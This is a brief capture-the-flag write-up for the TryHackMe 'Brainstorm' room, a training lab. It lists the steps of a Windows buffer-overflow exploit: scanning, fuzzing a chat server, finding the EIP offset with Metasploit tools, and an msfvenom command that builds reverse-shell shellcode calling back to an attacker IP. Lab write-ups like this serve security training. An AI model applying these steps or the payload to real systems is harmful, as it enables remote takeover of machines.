# Writeup for [Brainstorm](https://tryhackme.com/room/brainstorm)


```
set -gx IP 10.10.178.146
```


## Task 1: Deploy VM

* doing default nmap scan `nmap -sV -A -Pn -oN nmap/initial $IP`
* found Anonymous ftp access
* found `chatserver.exe` file
* downloaded file and loaded in immunity debugger on windows vm
* started fuzzing on port 9999
* Fuzzing crashed at 3000 bytes
* Address of EIP: 776c4c1c
* Executing `python message-exploit.py`
* Inserting `buffer = "A" * 3000`
* Generating pattern `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000`
* Executing `python message-exploit.py`
* Find exact match: `/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 31704330`
* Found offset: **2012**
* Search for EIP address after crash
* inserted shell_code to python script generated from `msfvenom -p windows/shell_reverse_tcp LHOST=10.8.60.141 LPORT=4444 -b "\x00" -f python --var-name shellcode EXITFUNC=thread`
